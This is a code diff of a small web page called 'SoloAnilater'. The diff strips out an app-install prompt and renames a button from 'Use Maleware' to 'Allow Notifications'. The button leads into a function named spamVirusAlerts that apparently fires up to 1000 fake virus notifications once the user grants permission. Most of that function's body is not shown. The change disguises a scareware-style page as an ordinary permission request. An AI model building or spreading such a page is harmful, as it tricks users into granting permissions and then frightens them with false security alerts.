@@ -4,40 +4,32 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>SoloAnilater</title>
-<link rel="manifest" href="manifest.json" />
 <style>
-  body {
-    font-family: Arial, sans-serif;
-    background: #111;
-    color: #eee;
-    height: 100vh;
-    margin: 0;
+  html, body {
+    margin: 0; padding: 0; height: 100%;
+    background: black;
+    color: white;
     display: flex;
-    flex-direction: column;
     justify-content: center;
     align-items: center;
+    font-family: Arial, sans-serif;
     user-select: none;
-    text-align: center;
-    padding: 1rem;
-  }
-  #appUI {
-    display: none;
     flex-direction: column;
-    align-items: center;
+    text-align: center;
   }
   h1 {
     font-size: 4rem;
-    margin: 0 0 1.5rem 0;
+    margin-bottom: 2rem;
   }
   button {
-    font-size: 1.5rem;
-    padding: 0.8rem 2rem;
+    font-size: 1.8rem;
+    padding: 1rem 3rem;
     border: none;
     border-radius: 8px;
     background-color: #ff0000;
     color: white;
     cursor: pointer;
-    box-shadow: 0 0 10px #ff4444;
+    box-shadow: 0 0 15px #ff4444;
     transition: background-color 0.3s ease;
   }
   button:hover {
@@ -48,64 +40,15 @@
     cursor: not-allowed;
     box-shadow: none;
   }
-  #installPrompt {
-    max-width: 400px;
-    background: #222;
-    border: 2px solid #ff0000;
-    padding: 1rem 2rem;
-    border-radius: 12px;
-  }
 </style>
 </head>
 <body>
 
-<div id="installPrompt">
-  <h2>Install SoloAnilater App</h2>
-  <p>To continue, please install this app on your device.</p>
-  <button id="installBtn">Install App</button>
-</div>
-
-<div id="appUI">
-  <h1>SoloAnilater</h1>
-  <button id="notifyBtn">Use Maleware</button>
-</div>
+<h1>SoloAnilater</h1>
+<button id="notifyBtn">Allow Notifications</button>
 
 <script>
-let deferredPrompt;
-const installPromptDiv = document.getElementById('installPrompt');
-const installBtn = document.getElementById('installBtn');
-const appUI = document.getElementById('appUI');
 const notifyBtn = document.getElementById('notifyBtn');
-
-window.addEventListener('beforeinstallprompt', (e) => {
-  // Prevent Chrome 67 and earlier from automatically showing the prompt
-  e.preventDefault();
-  deferredPrompt = e;
-  installPromptDiv.style.display = 'block';
-});
-
-installBtn.addEventListener('click', async () => {
-  if (!deferredPrompt) return;
-  deferredPrompt.prompt();
-  const { outcome } = await deferredPrompt.userChoice;
-  if (outcome === 'accepted') {
-    installPromptDiv.style.display = 'none';
-    showAppUI();
-  } else {
-    alert('Installation is required to continue.');
-  }
-  deferredPrompt = null;
-});
-
-// Detect if already installed
-if (window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true) {
-  installPromptDiv.style.display = 'none';
-  showAppUI();
-}
-
-function showAppUI() {
-  appUI.style.display = 'flex';
-}
 
 function spamVirusAlerts(maxCount = 1000) {
   if (Notification.permission !== "granted") return;
@@ -141,12 +84,6 @@ notifyBtn.addEventListener('click', () => {
     }
   });
 });
-</script>
-
-<script>
-  if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('sw.js').catch(console.error);
-  }
 </script>
 
 </body>
